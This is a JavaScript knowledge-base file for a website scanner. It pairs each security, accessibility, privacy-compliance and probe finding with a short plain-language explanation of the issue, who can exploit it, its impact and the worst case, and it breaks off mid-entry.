'use strict';
/**
 * Finding explanation and exploit-walkthrough knowledge base + attachment helper.
 */

/* ------------------------------------------------------------------ *
 * "Proof / what it means" explanation layer.
 * Every finding gets a plain-language block: what it is, who can act on
 * it, the real-world impact, and the worst case if left unfixed.
 * ------------------------------------------------------------------ */

const GENERIC_EXPLAIN = {
  whatItIs: 'A weakness a scanner detected on this page.',
  whoCanAct: 'Anyone who can reach the site over the network.',
  impact: 'Increases attack surface and can undermine user trust or compliance.',
  worstCase: 'Left unfixed it can be chained with other issues into a real compromise.',
};

const EXPLAIN = {
  'waf-challenge-intercepted': {
    whatItIs: 'An automated WAF / Bot Management challenge intercepted the crawler request.',
    whoCanAct: 'Webmasters configuring WAF / bot mitigation rules.',
    impact: 'Automated crawlers that do not execute JavaScript challenges see the interstitial page rather than site content.',
    worstCase: 'Certain crawlers or search engines may be hindered from indexing if bot protection rules are too aggressive.',
  },
  'waf-headers-unverified': {
    whatItIs: 'A WAF challenged the direct request and Firecrawl retrieved the page HTML without exposing the origin’s HTTP response headers.',
    whoCanAct: 'Site owners auditing WAF-protected origins through unauthenticated remote crawlers.',
    impact: 'HTTP header checks (HSTS, CSP, cookies, CORS) were skipped so CDN/WAF challenge headers are never mistaken for origin configuration.',
    worstCase: 'Security score is capped as partial/unverified until origin headers are checked directly or harvested cleanly.',
  },
  'eu-cookie-excessive-duration': {
    whatItIs: 'One or more cookies set a Max-Age exceeding 13 months (34,164,000 seconds).',
    whoCanAct: 'Data-protection regulators reviewing ePrivacy and GDPR retention compliance.',
    impact: 'Long-lived tracking or session identifiers persist longer than EDPB/CNIL 13-month guidance.',
    worstCase: 'Regulatory finding under GDPR Art. 5(1)(e) storage limitation / data minimisation rules.',
  },
  'seo-private-noindex': {
    whatItIs: 'Both robots.txt (`Disallow: /`) and `<meta name="robots" content="noindex">` opt the page out of search indexing.',
    whoCanAct: 'Site owners and developers intentionally gating a private or authenticated portal.',
    impact: 'Search engines exclude the page from results, so public SERP/structured-data checks are skipped.',
    worstCase: 'Informational only unless applied accidentally to a public marketing page.',
  },
  'tls-untrusted': {
    whatItIs: 'The HTTPS certificate could not be verified against a trusted root.',
    whoCanAct: 'Attackers positioned on the network (public Wi-Fi, ISP) can impersonate the site.',
    impact: 'Browsers show a scary warning; users may click through and lose data to a fake site.',
    worstCase: 'Full man-in-the-middle: passwords and cookies stolen, sessions hijacked.',
  },
  'tls-expiring': {
    whatItIs: 'The certificate expires very soon.',
    whoCanAct: 'No attacker needed — the site will break on its own.',
    impact: 'On expiry every visitor is blocked by a full-page interstitial.',
    worstCase: 'Total outage until the cert is renewed; lost sales and SEO ranking.',
  },
  'tls-old-protocol': {
    whatItIs: 'The server still negotiates an outdated TLS version (e.g. TLS 1.0/1.1).',
    whoCanAct: 'Network attackers can exploit known flaws in those older protocol versions.',
    impact: 'Traffic can potentially be decrypted or downgraded.',
    worstCase: 'Cryptographic weaknesses in the old protocol leak encrypted data.',
  },
  'disclosure': {
    whatItIs: 'A response header reveals the software and its version.',
    whoCanAct: 'Anyone — headers are public.',
    impact: 'The exact stack/version is handed to an attacker for CVE matching.',
    worstCase: 'A known exploit for that version is fired at you immediately.',
  },
  'no-https': {
    whatItIs: 'The site is served over unencrypted HTTP.',
    whoCanAct: 'Anyone on the path (coffee-shop Wi-Fi, ISP, hostile router) can read or alter traffic.',
    impact: 'Everything typed into the site is visible in plain text; content can be injected.',
    worstCase: 'Credentials and payment data stolen; malicious scripts injected into pages.',
  },
  'hdr-strict-transport-security': {
    whatItIs: 'No HSTS header — the browser is not told to only ever use HTTPS.',
    whoCanAct: 'A network attacker can strip HTTPS and downgrade the first request to HTTP.',
    impact: 'The protection of HTTPS can be bypassed on the very first visit.',
    worstCase: 'SSL-stripping attack silently serves a fake HTTP clone and steals logins.',
  },
  'hdr-content-security-policy': {
    whatItIs: 'No Content-Security-Policy — the browser has no rules for what may load/run.',
    whoCanAct: 'Anyone who can get script into the page (stored/reflected XSS, bad ad, third-party lib).',
    impact: 'Malicious scripts run with full access to the page and its cookies.',
    worstCase: 'Session/token theft and account takeover via injected JavaScript.',
  },
  'csp-weak': {
    whatItIs: 'The CSP allows unsafe-inline/unsafe-eval, which defeats most of its XSS protection.',
    whoCanAct: 'An attacker who can inject markup into the page.',
    impact: 'The safety net you deployed does not actually stop inline script execution.',
    worstCase: 'XSS slips straight through despite a CSP being "present".',
  },
  'cookie-insecure': {
    whatItIs: 'A cookie can be sent over plain HTTP because it lacks the Secure flag.',
    whoCanAct: 'A network attacker who can force an HTTP request (downgrade, mixed content).',
    impact: 'The cookie value leaks in cleartext over the wire.',
    worstCase: 'Session cookie captured → attacker logs in as the user.',
  },
  'cookie-httponly': {
    whatItIs: 'A cookie is readable by JavaScript because it lacks HttpOnly.',
    whoCanAct: 'Anyone who achieves XSS on the site.',
    impact: 'Injected scripts can read the cookie directly.',
    worstCase: 'One XSS bug becomes instant, durable account takeover.',
  },
  'cookie-samesite': {
    whatItIs: 'A cookie has no SameSite attribute.',
    whoCanAct: 'A malicious third-party site the user visits.',
    impact: 'The cookie is sent on cross-site requests.',
    worstCase: 'CSRF attacks perform actions as the logged-in user.',
  },
  'mixed-content': {
    whatItIs: 'Some resources load over plain HTTP on an HTTPS page.',
    whoCanAct: 'A network attacker can tamper with those specific resources.',
    impact: 'Browsers block them (broken UI) or render them insecurely.',
    worstCase: 'An attacker swaps a script/iframe for a malicious one.',
  },
  'secret-leak': {
    whatItIs: 'Something that looks like a live credential is shipped to the browser.',
    whoCanAct: 'Literally anyone — it is public in the page source / JS bundle.',
    impact: 'The key can be used to bill you, read data, or send email as you.',
    worstCase: 'Cloud account drained, data exfiltrated, mail sent to your customers.',
  },
  'infra-paths': {
    whatItIs: 'The page references sensitive infra files (.env, .git, backups...).',
    whoCanAct: 'Anyone who guesses the path.',
    impact: 'If the file is actually served, source/credentials leak directly.',
    worstCase: 'Full repo or environment (DB passwords) download in one request.',
  },
  'sourcemaps': {
    whatItIs: 'Source maps are published alongside the production JavaScript.',
    whoCanAct: 'Any visitor with dev tools.',
    impact: 'Un-minified original source, comments and internal logic are readable.',
    worstCase: 'Hidden endpoints, feature flags and auth logic become trivial to study.',
  },
  'insecure-form': {
    whatItIs: 'A form submits its data over plain HTTP.',
    whoCanAct: 'A network attacker on the path.',
    impact: 'Form input (names, emails, passwords) travels in cleartext.',
    worstCase: 'Credential capture and identity theft from a login/contact form.',
  },
  'dns-spf': {
    whatItIs: 'The domain has no SPF record, so mail servers cannot verify who may send as @yourdomain.',
    whoCanAct: 'Any spammer can spoof your domain.',
    impact: 'Phishing emails appear to come from you legitimately.',
    worstCase: 'Brand-damaging phishing and your own mail landing in spam.',
  },
  'dns-dmarc': {
    whatItIs: 'No DMARC policy tells receivers what to do with spoofed mail.',
    whoCanAct: 'Attackers sending forged mail as your domain.',
    impact: 'Spoofed mail is delivered with no enforcement.',
    worstCase: 'CEO-fraud / invoice-fraud emails that look 100% legitimate.',
  },
  'dns-caa': {
    whatItIs: 'No CAA record limits which certificate authorities may issue certs for the domain.',
    whoCanAct: 'Any CA tricked (or compromised) into issuing for your domain.',
    impact: 'An attacker can obtain a valid-looking certificate for your domain.',
    worstCase: 'Trusted-looking HTTPS site that impersonates you.',
  },
  'cors-wildcard-credentials': {
    whatItIs: 'CORS allows any origin *and* credentials at the same time.',
    whoCanAct: 'Any website the victim visits can read authenticated responses.',
    impact: 'Authenticated API data is exposed cross-origin.',
    worstCase: 'Any page on the internet can silently read a logged-in user\'s data.',
  },
  'cors-wildcard': {
    whatItIs: 'CORS is wide open (Access-Control-Allow-Origin: *).',
    whoCanAct: 'Any website can read public responses from this API.',
    impact: 'Fine for truly public data, risky if any response is sensitive.',
    worstCase: 'Accidentally-exposed user data readable by any origin.',
  },
  'js-secret': {
    whatItIs: 'A JavaScript bundle contains what looks like a credential.',
    whoCanAct: 'Anyone — the bundle is downloaded by every visitor.',
    impact: 'The key/token can be reused outside your app.',
    worstCase: 'Service abuse, data access, or billing fraud using your key.',
  },
  'exposed-path': {
    whatItIs: 'A common sensitive file is reachable directly on the web server.',
    whoCanAct: 'Anyone who guesses the standard filename.',
    impact: 'The file\'s contents (config, history, backups) are downloadable.',
    worstCase: 'Credentials or full source disclosure in a single GET.',
  },
  'broken-link': {
    whatItIs: 'An internal link on the site is broken (returns an error).',
    whoCanAct: 'No attacker needed — visitors hit it.',
    impact: 'Dead ends frustrate users and leak crawl budget to search engines.',
    worstCase: 'Key conversion paths (pricing, signup) silently 404.',
  },
  'tech-detected': {
    whatItIs: 'The stack is fingerprinted from headers and markup.',
    whoCanAct: 'Attackers use this to target known CVEs for that exact version.',
    impact: 'Tells an attacker precisely which exploits to try.',
    worstCase: 'An unpatched CMS/plugin version is matched to a public exploit.',
  },
  'hdr-cross-origin-opener-policy': {
    whatItIs: 'The page does not isolate itself from cross-origin windows (COOP).',
    whoCanAct: 'A malicious site that opens or is opened by your page.',
    impact: 'It can keep a live reference to your window and probe it (XS-Leaks).',
    worstCase: 'Cross-origin data leakage or Spectre-class side-channel access.',
  },
  'hdr-cross-origin-resource-policy': {
    whatItIs: 'Any origin can embed this site\'s resources in its own pages.',
    whoCanAct: 'Third-party sites hot-linking or embedding your assets.',
    impact: 'Bandwidth theft and content being framed out of context.',
    worstCase: 'Your assets appear inside an attacker\'s page, aiding brand spoofing.',
  },
  'hdr-cross-origin-embedder-policy': {
    whatItIs: 'The page is not cross-origin isolated (COEP missing).',
    whoCanAct: 'No direct attacker; it is a missing defence-in-depth control.',
    impact: 'You cannot opt into cross-origin isolation for sensitive APIs.',
    worstCase: 'Hardening for Spectre-class attacks is unavailable.',
  },
  'csp-no-trusted-types': {
    whatItIs: 'The CSP does not require Trusted Types for DOM sinks.',
    whoCanAct: 'Anyone able to inject a DOM script into the page.',
    impact: 'DOM-based XSS is not blocked where scripts are assigned to sinks.',
    worstCase: 'A stored/injected payload executes in a victim\'s authenticated session.',
  },
  'csp-no-object-src': {
    whatItIs: 'The CSP does not restrict plugin content (`object-src`).',
    whoCanAct: 'An attacker who can place <object>/<embed> markup.',
    impact: 'Legacy plugin content can execute code.',
    worstCase: 'XSS via an unrestricted plugin resource.',
  },
  'csp-no-base-uri': {
    whatItIs: 'The CSP does not lock the document base URI.',
    whoCanAct: 'An attacker who can inject a <base> tag.',
    impact: 'All relative URLs (including scripts) are redirected to the attacker.',
    worstCase: 'Full script hijack of every relative resource on the page.',
  },
  'csp-no-frame-ancestors': {
    whatItIs: 'Nothing prevents any origin from framing the page.',
    whoCanAct: 'Anyone who embeds your site in an iframe.',
    impact: 'Clickjacking / UI-redress attacks are possible.',
    worstCase: 'Users tricked into clicking attacker-controlled overlays (money, permissions).',
  },
  'csp-no-upgrade-insecure': {
    whatItIs: 'Sub-resources over http:// are not auto-upgraded.',
    whoCanAct: 'A network attacker on the same path.',
    impact: 'Mixed-content requests stay insecure.',
    worstCase: 'Injected sub-resource over plain HTTP (script/CSS) compromises the page.',
  },
  'csp-http-source': {
    whatItIs: 'The CSP whitelists plain-http origins.',
    whoCanAct: 'A network attacker who can serve that http:// origin.',
    impact: 'Whitelisted scripts/styles load unencrypted and can be tampered with.',
    worstCase: 'Injected script from the http:// source runs with full page privileges.',
  },
  'csp-no-default-src': {
    whatItIs: 'The CSP has no `default-src` fallback.',
    whoCanAct: 'No direct attacker; a policy gap.',
    impact: 'Resource types you did not explicitly list are unrestricted.',
    worstCase: 'An unlisted resource type (e.g. connect-src) is left wide open.',
  },
  'hsts-weak-maxage': {
    whatItIs: 'HSTS is enabled but with a short max-age.',
    whoCanAct: 'A network attacker during the short validity window.',
    impact: 'There is a recurring window where the first request can be downgraded.',
    worstCase: 'Cookie/session interception via an SSL-strip style downgrade.',
  },
  'hsts-no-preload': {
    whatItIs: 'HSTS lacks includeSubDomains and/or preload.',
    whoCanAct: 'A network attacker against subdomains.',
    impact: 'Subdomains and the very first visit are not protected.',
    worstCase: 'Downgrade attack on a subdomain before HSTS is learned.',
  },
  'hdr-deprecated': {
    whatItIs: 'A deprecated security header is still being sent.',
    whoCanAct: 'No direct attacker; it is dead weight / a misconfiguration signal.',
    impact: 'The header no longer protects anything.',
    worstCase: 'Misleading config that hides the real (missing) control.',
  },
  'deprecated-document-domain': {
    whatItIs: 'The page calls `document.domain` to relax its origin.',
    whoCanAct: 'Any other origin sharing the relaxed domain.',
    impact: 'Origin isolation is weakened.',
    worstCase: 'A compromised subdomain reads this origin\'s data.',
  },
  'dns-mta-sts': {
    whatItIs: 'No MTA-STS policy to force TLS for inbound mail.',
    whoCanAct: 'A network attacker positioned to intercept SMTP.',
    impact: 'Mail can be delivered over an unencrypted/downgraded channel.',
    worstCase: 'Silent interception of email in transit.',
  },
  'dns-tls-rpt': {
    whatItIs: 'No TLS-RPT report address for mail TLS failures.',
    whoCanAct: 'No direct attacker; a visibility gap.',
    impact: 'You never learn when inbound TLS fails or is downgraded.',
    worstCase: 'Ongoing SMTP downgrade goes unnoticed.',
  },
  'server-version-leak': {
    whatItIs: 'An HTTP response header explicitly discloses exact software or runtime version banners.',
    whoCanAct: 'Attackers mapping the perimeter looking for specific known CVEs.',
    impact: 'Attackers skip the reconnaissance phase and immediately test version-specific exploits.',
    worstCase: 'Immediate targeting with zero-day or known unpatched exploits matching that exact version.',
  },
  'vuln-php-eol': {
    whatItIs: 'The web server discloses an End-of-Life PHP runtime (< 8.2) containing known Remote Code Execution (RCE) vulnerabilities.',
    whoCanAct: 'Remote unauthenticated attackers capable of sending HTTP queries.',
    impact: 'Vulnerable to critical flaws including CVE-2024-4577 (Windows CGI argument injection RCE), CVE-2024-8926, and CVE-2024-9026.',
    worstCase: 'Arbitrary server takeover, web shell placement, and full database exfiltration.',
  },
  'vuln-php-81-eol': {
    whatItIs: 'The web server runs PHP 8.1, which reached official End-of-Life and receives no upstream security patches.',
    whoCanAct: 'Attackers discovering vulnerabilities in unmaintained versions.',
    impact: 'Newly discovered PHP vulnerabilities will never be patched for this version.',
    worstCase: 'Exploitation of unpatched core PHP memory safety or parsing flaws.',
  },
  'vuln-apache-outdated': {
    whatItIs: 'The server discloses an Apache HTTP Server version prior to 2.4.60 with known SSRF and proxy escape vulnerabilities.',
    whoCanAct: 'Remote attackers crafting malformed requests or path traversal patterns.',
    impact: 'Vulnerable to CVE-2024-38472 (UNC SSRF), CVE-2024-38475 (mod_rewrite bypass), and CVE-2024-39573.',
    worstCase: 'Internal network SSRF, bypass of access controls, or arbitrary command execution via CGI/proxy handlers.',
  },
  'vuln-nodejs-eol': {
    whatItIs: 'The application runs on an End-of-Life Node.js runtime (< v20) missing recent security releases.',
    whoCanAct: 'Attackers crafting malformed HTTP requests.',
    impact: 'Misses critical security releases for HTTP request smuggling and permission model escapes.',
    worstCase: 'HTTP request smuggling leading to cache poisoning and unauthorized request execution.',
  },
  'vuln-nginx-outdated': {
    whatItIs: 'The server discloses an outdated Nginx version lacking recent HTTP/2 and HTTP/3 stability and security fixes.',
    whoCanAct: 'Network attackers sending malformed HTTP/2 or HTTP/3 frames.',
    impact: 'Susceptible to worker process crashes and memory corruption (e.g. CVE-2024-34161).',
    worstCase: 'Denial of service through continuous worker termination.',
  },
  'vuln-jquery-outdated': {
    whatItIs: 'The page loads an outdated jQuery version (< 3.5.0) with known Cross-Site Scripting (XSS) vulnerabilities.',
    whoCanAct: 'Attackers passing untrusted HTML/DOM input into jQuery selectors or manipulation methods.',
    impact: 'Known htmlPrefilter regex flaws allow arbitrary script execution (CVE-2020-11022, CVE-2020-11023).',
    worstCase: 'Stored or reflected Cross-Site Scripting, session token theft, and account takeover.',
  },
  'vuln-angularjs-eol': {
    whatItIs: 'The application loads legacy AngularJS 1.x, which reached End-of-Life on December 31, 2021.',
    whoCanAct: 'Attackers exploiting client-side template injection (CSTI) and expression sandbox escapes.',
    impact: 'Dozens of public sandbox escape exploits allow executing arbitrary JS in the user browser.',
    worstCase: 'Universal Cross-Site Scripting on any page with user-controlled templates.',
  },
  'vuln-polyfill-malicious': {
    whatItIs: 'The website imports JavaScript from polyfill.io, bootcdn.net, or related compromised CDN domains.',
    whoCanAct: 'Rogue operator controlling hijacked CDN domains (CVE-2024-38521).',
    impact: 'The CDN selectively injects malware, drive-by downloads, and phishing redirects into mobile visitors\' browsers.',
    worstCase: 'Complete site defacement, credential harvesting, and customer fraud under your domain.',
  },
  'vuln-wordpress-outdated': {
    whatItIs: 'The site runs an outdated WordPress core release containing known critical vulnerabilities.',
    whoCanAct: 'Remote unauthenticated or authenticated attackers targeting WordPress endpoints.',
    impact: 'Vulnerable to known core CVEs including SSRF/RCE in media blocks (CVE-2024-4439) and privilege escalation (CVE-2024-31210).',
    worstCase: 'Administrative account takeover, arbitrary plugin/shell upload, and database exfiltration.',
  },
  'vuln-nextjs-ssrf': {
    whatItIs: 'The site runs Next.js < 14.1.1 with known Server Actions SSRF and cache poisoning vulnerabilities.',
    whoCanAct: 'Remote attackers sending manipulated Host headers to Server Actions endpoints.',
    impact: 'Vulnerable to CVE-2024-34351 (SSRF via Server Actions redirect handling) and cache poisoning.',
    worstCase: 'Internal cloud metadata extraction (AWS IMDS, GCP) and private microservice credential theft.',
  },
  'vuln-lodash-outdated': {
    whatItIs: 'The site loads an outdated version of Lodash (< 4.17.21) with known prototype pollution vulnerabilities.',
    whoCanAct: 'Attackers providing crafted JSON or query parameters to object merging utilities.',
    impact: 'Prototype pollution via _.merge and template injection (CVE-2020-8203, CVE-2021-23337).',
    worstCase: 'Application logic subversion, denial of service, or remote command execution.',
  },
  'vuln-bootstrap-outdated': {
    whatItIs: 'The site loads Bootstrap < 4.3.1 or legacy Bootstrap 3.x with known XSS vulnerabilities.',
    whoCanAct: 'Attackers injecting HTML or data attributes into components with tooltips, popovers, or scrollspy.',
    impact: 'Known Cross-Site Scripting via unescaped data-attributes (CVE-2019-8331, CVE-2018-14041).',
    worstCase: 'Execution of malicious JavaScript, session hijacking, and DOM spoofing.',
  },
  'vuln-moment-redos': {
    whatItIs: 'The site loads Moment.js < 2.29.4 with known Regular Expression Denial of Service (ReDoS) flaws.',
    whoCanAct: 'Remote attackers providing malformed date strings or locale paths.',
    impact: 'Exponential regex backtracking stalls Node.js or browser threads (CVE-2022-31129, CVE-2022-24785).',
    worstCase: 'Denial of service via thread exhaustion.',
  },
  'vuln-axios-outdated': {
    whatItIs: 'The application loads Axios < 1.7.4 with known SSRF and credential leak vulnerabilities.',
    whoCanAct: 'Attackers inducing HTTP requests that redirect across origins.',
    impact: 'Axios leaks Authorization headers across cross-origin redirects (CVE-2023-45857) or bypasses SSRF restrictions (CVE-2024-39338).',
    worstCase: 'Confidential bearer tokens or API keys leaked to untrusted origins.',
  },

  /* ------------------------------------------------------------------ *
   * Coverage for the finding families that previously fell through to
   * GENERIC_EXPLAIN (accessibility, SEO, performance, EU compliance and
   * the active probes). Without these entries those cards read
   * "A weakness a scanner detected on this page", which is exactly the
   * vague explanation this layer exists to remove.
   * ------------------------------------------------------------------ */

  /* ---- accessibility (quality exposure, not an attack vector) ---- */
  'a11y-alt': {
    whatItIs: 'One or more <img> elements carry no alt attribute, so no text alternative exists.',
    whoCanAct: 'No attacker — screen-reader and low-bandwidth users are the ones excluded.',
    impact: 'Blind users hear "image" with no description; search engines cannot read the image intent.',
    worstCase: 'Fails WCAG 2.2 AA and the EU Accessibility Act — legal exposure and lost customers.',
  },
  'a11y-alt-rendered': {
    whatItIs: 'Images injected by JavaScript have no alt text in the live DOM.',
    whoCanAct: 'No attacker — assistive-tech users are excluded.',
    impact: 'The static scan saw nothing, so the gap ships silently to production.',
    worstCase: 'A persistent WCAG 2.2 · 1.1.1 failure across every JS-rendered view.',
  },
  'a11y-autocomplete': {
    whatItIs: 'Personal-data form fields have no autocomplete token.',
    whoCanAct: 'No attacker — users with motor or cognitive disabilities must hand-type everything.',
    impact: 'Slower, error-prone checkout and signup; higher abandonment.',
    worstCase: 'A WCAG 2.2 · 1.3.5 / 3.3.2 failure and a materially worse conversion rate.',
  },
  'a11y-autoplay': {
    whatItIs: 'Media plays automatically with sound and no obvious control.',
    whoCanAct: 'No attacker — it hijacks the user audio channel.',
    impact: 'Screen readers and assistive audio are drowned out; users leave the page.',
    worstCase: 'A WCAG 2.2 · 1.4.2 / 2.2.2 failure — audio cannot be paused or stopped.',
  },
  'a11y-button-semantics': {
    whatItIs: 'Clickable controls are anchors without an href (links used as buttons).',
    whoCanAct: 'No attacker — keyboard and screen-reader users cannot trigger them.',
    impact: 'Assistive tech announces "link" for an action, and Enter/Space does not activate it.',
    worstCase: 'A WCAG 2.2 · 4.1.2 / 2.1.1 failure — core UI is unreachable without a mouse.',
  },
  'a11y-contrast': {
    whatItIs: 'Text/background colour contrast is below the WCAG AA ratio.',
    whoCanAct: 'No attacker — low-vision users cannot read the text.',
    impact: 'Content is unreadable in bright light or for the ~1 in 12 men with colour-vision issues.',
    worstCase: 'A WCAG 2.2 · 1.4.3 failure — the page is legally non-compliant and commercially inaccessible.',
  },
  'a11y-focus-visible': {
    whatItIs: 'CSS removes the focus outline with no replacement style.',
    whoCanAct: 'No attacker — keyboard-only users lose their position on the page.',
    impact: 'Users cannot tell which control will activate; keyboard navigation becomes guesswork.',
    worstCase: 'A WCAG 2.2 · 2.4.7 / 1.4.11 failure — the site is unusable without a mouse.',
  },
  'a11y-h1': {
    whatItIs: 'The page has no top-level <h1> heading.',
    whoCanAct: 'No attacker — the document outline is ambiguous for assistive tech.',
    impact: 'Screen readers cannot announce the page topic; search engines get a weak relevance signal.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure plus weaker ranking for the page main keyword.',
  },
  'a11y-h1-multi': {
    whatItIs: 'The page has more than one <h1>.',
    whoCanAct: 'No attacker — the heading outline is flattened.',
    impact: 'Multiple top-level headings confuse screen-reader navigation and dilute SEO focus.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure and an inconsistent heading structure site-wide.',
  },
  'a11y-heading-order': {
    whatItIs: 'Heading levels are skipped (for example h2 to h4).',
    whoCanAct: 'No attacker — non-visual navigation breaks.',
    impact: 'Assistive-tech users cannot infer the section hierarchy.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure; deep sections become unreachable by heading jump.',
  },
  'a11y-label': {
    whatItIs: 'Form controls have no programmatic label.',
    whoCanAct: 'No attacker — screen-reader and voice-control users cannot identify the field.',
    impact: 'Users cannot complete forms, and voice commands have no target name.',
    worstCase: 'A WCAG 2.2 · 1.3.1 / 4.1.2 failure — checkout and signup are blocked.',
  },
  'a11y-landmark': {
    whatItIs: 'The primary content is not wrapped in a <main> landmark.',
    whoCanAct: 'No attacker — assistive tech cannot jump to the content.',
    impact: 'Every page requires tabbing through the whole navigation.',
    worstCase: 'A WCAG 2.2 · 1.3.1 / 2.4.1 failure across the site.',
  },
  'a11y-lang': {
    whatItIs: 'The <html> element has no lang attribute.',
    whoCanAct: 'No attacker — screen readers guess the pronunciation language.',
    impact: 'Content is read in the wrong language or accent; translation tools misfire.',
    worstCase: 'A WCAG 2.2 · 3.1.1 failure — the page is unintelligible to non-visual users.',
  },
  'a11y-link-text': {
    whatItIs: 'Links have non-descriptive text (such as "click here" or "read more").',
    whoCanAct: 'No attacker — screen-reader users hear a list of identical links.',
    impact: 'Link purpose is unknowable when read out of context.',
    worstCase: 'A WCAG 2.2 · 2.4.4 / 2.4.9 failure.',
  },
  'a11y-live-region': {
    whatItIs: 'Dynamic status messages are not exposed through an ARIA live region.',
    whoCanAct: 'No attacker — screen-reader users miss every update.',
    impact: 'Cart changes, form errors and toasts are silent.',
    worstCase: 'A WCAG 2.2 · 4.1.3 failure — the app appears frozen to non-visual users.',
  },
  'a11y-reduced-motion': {
    whatItIs: 'CSS animations run with no prefers-reduced-motion fallback.',
    whoCanAct: 'No attacker — motion-sensitive users are affected.',
    impact: 'Can trigger vestibular discomfort, nausea and migraine.',
    worstCase: 'A WCAG 2.2 · 2.3.3 failure — a genuine health and safety issue.',
  },
  'a11y-skip-link': {
    whatItIs: 'There is no "skip to content" link.',
    whoCanAct: 'No attacker — keyboard users must tab through the entire nav on every page.',
    impact: 'The navigation cost multiplies across the whole site.',
    worstCase: 'A WCAG 2.2 · 2.4.1 failure.',
  },
  'a11y-statement': {
    whatItIs: 'No accessibility statement page was found.',
    whoCanAct: 'No attacker — a compliance and transparency gap.',
    impact: 'Users cannot report barriers or see your conformance target.',
    worstCase: 'The EU Accessibility Act and public-sector rules expect a published statement.',
  },
  'a11y-table-headers': {
    whatItIs: 'Data tables use no <th> header cells.',
    whoCanAct: 'No attacker — screen readers cannot associate cells with columns.',
    impact: 'Tabular data is read as an unstructured stream of numbers.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure — financial and data tables become unusable.',
  },
  'a11y-title': {
    whatItIs: 'The page has a missing or empty <title>.',
    whoCanAct: 'No attacker — orientation is lost.',
    impact: 'Browser tabs, bookmarks and screen readers show no page name.',
    worstCase: 'A WCAG 2.2 · 2.4.2 failure plus a broken SEO title.',
  },
  'a11y-zoom': {
    whatItIs: 'Pinch-zoom is disabled via user-scalable=no or maximum-scale=1.',
    whoCanAct: 'No attacker — low-vision users cannot magnify the page.',
    impact: 'Users are forced to read tiny text they cannot enlarge.',
    worstCase: 'A WCAG 2.2 · 1.4.4 failure — a direct accessibility barrier.',
  },

  /* ---- EU / GDPR compliance ---- */
  'eu-no-cmp': {
    whatItIs: 'Trackers run with no detectable consent mechanism.',
    whoCanAct: 'A data-protection authority and any user who complains; no attacker needed.',
    impact: 'Non-essential cookies and identifiers are set before consent — unlawful processing.',
    worstCase: 'A GDPR Art. 6-7 + ePrivacy Art. 5(3) breach; fines up to 4% of global turnover.',
  },
  'eu-consent-mode-default': {
    whatItIs: 'Consent Mode does not default to denied before opt-in.',
    whoCanAct: 'A regulator — the default state already leaks data.',
    impact: 'Analytics and ad storage are granted before the user consents.',
    worstCase: 'An EDPB / Consent Mode v2 breach — pre-consent data leakage is provable from the tag order.',
  },
  'eu-pre-consent-firing': {
    whatItIs: 'Trackers appear to fire before the user consents.',
    whoCanAct: 'Any visitor inspecting network traffic, and a regulator.',
    impact: 'Device storage and reads happen pre-consent — the exact thing ePrivacy forbids.',
    worstCase: 'An ePrivacy Art. 5(3) + GDPR breach, demonstrated with a single HAR file.',
  },
  'eu-third-party-cookie': {
    whatItIs: 'Cookies are set on domains you do not own.',
    whoCanAct: 'The third party receiving the data, and a regulator.',
    impact: 'Data flows to third parties / third countries without a documented basis.',
    worstCase: 'A GDPR Art. 44 breach — unlawful international transfer.',
  },
  'eu-ai-act-disclosure': {
    whatItIs: 'An AI system is in use without a user-facing AI disclosure.',
    whoCanAct: 'A regulator or market-surveillance authority.',
    impact: 'Users interact with AI without being told, and generated content is not marked.',
    worstCase: 'An EU AI Act (2024/1689) Art. 50 transparency breach; fines up to 3% of turnover.',
  },
  'eu-dsa-trader-info': {
    whatItIs: 'An online-sales page omits the required DSA trader information.',
    whoCanAct: 'A DSA enforcement authority.',
    impact: 'Consumers cannot verify who they are buying from.',
    worstCase: 'A DSA (2022/2065) Art. 30-31 breach — trading restrictions and fines.',
  },
  'eu-data-transfer': {
    whatItIs: 'Third-party infrastructure implies data leaving your control, possibly the EU.',
    whoCanAct: 'A regulator; attackers who may reach the third party.',
    impact: 'No DPA or SCC chain is documented for the sub-processor.',
    worstCase: 'A GDPR Chapter V breach — an unlawful transfer and a reportable incident.',
  },
  'eu-cookie-no-reject-button': {
    whatItIs: 'The cookie banner does not offer an equal single-click "Reject All" button on the first layer.',
    whoCanAct: 'A data protection authority, consumer protection agency, or any user.',
    impact: 'Users are nudged into accepting cookies because rejecting requires opening multi-layer settings (dark pattern).',
    worstCase: 'GDPR Art. 4(11) & Art. 7(3) violation under EDPB Cookie Banner Taskforce guidelines; regulatory enforcement orders and fines.',
  },
  'eu-preticked-consent': {
    whatItIs: 'A consent or newsletter subscription checkbox defaults to checked.',
    whoCanAct: 'A data protection authority or user making a GDPR complaint.',
    impact: 'Consent obtained via pre-ticked boxes is legally null and void under EU law.',
    worstCase: 'GDPR Art. 4(11) & CJEU Planet49 (C-673/17) breach; invalid consent invalidates all downstream marketing processing.',
  },
  'us-gpc-optout': {
    whatItIs: 'Trackers run without a US "Do Not Sell or Share" link or Global Privacy Control (GPC) opt-out mechanism.',
    whoCanAct: 'State Attorneys General (California CPPA, Texas AG, Colorado, Connecticut).',
    impact: 'US consumers cannot exercise their statutory right to opt out of cross-context behavioral advertising.',
    worstCase: 'Civil penalties under CCPA/CPRA ($2,500 to $7,500 per violation) and state regulatory enforcement sweeps.',
  },
  'privacy-session-replay': {
    whatItIs: 'Session replay software records user keystrokes and interactions without prior consent or wiretapping notice.',
    whoCanAct: 'Class-action plaintiffs\' attorneys and data protection regulators.',
    impact: 'Real-time DOM and keystroke capture without prior consent constitutes unlawful digital wiretapping.',
    worstCase: 'Statutory damages under California Invasion of Privacy Act (CIPA § 631) of $5,000 per violation, plus GDPR Article 82 claims.',
  },

  /* ---- active / probe findings ---- */
  'open-redirect': {
    whatItIs: 'A URL parameter controls where the server redirects the browser.',
    whoCanAct: 'Anyone who can send a crafted link — phishing is the usual route.',
    impact: 'Attackers hide a malicious destination behind your trusted domain.',
    worstCase: 'Credential phishing that bypasses link scanners, plus OAuth token theft.',
  },
  'reflected-input': {
    whatItIs: 'A request parameter is echoed into the response body.',
    whoCanAct: 'Anyone who can craft a URL or POST against the site.',
    impact: 'With no output encoding this is reflected XSS — a foothold in every visitor session.',
    worstCase: 'Session theft, keylogging, CSRF-token harvest and account takeover.',
  },
  'reflected-input-escaped': {
    whatItIs: 'A parameter is echoed but HTML-escaped, so no injection was demonstrated.',
    whoCanAct: 'Anyone who can craft the request.',
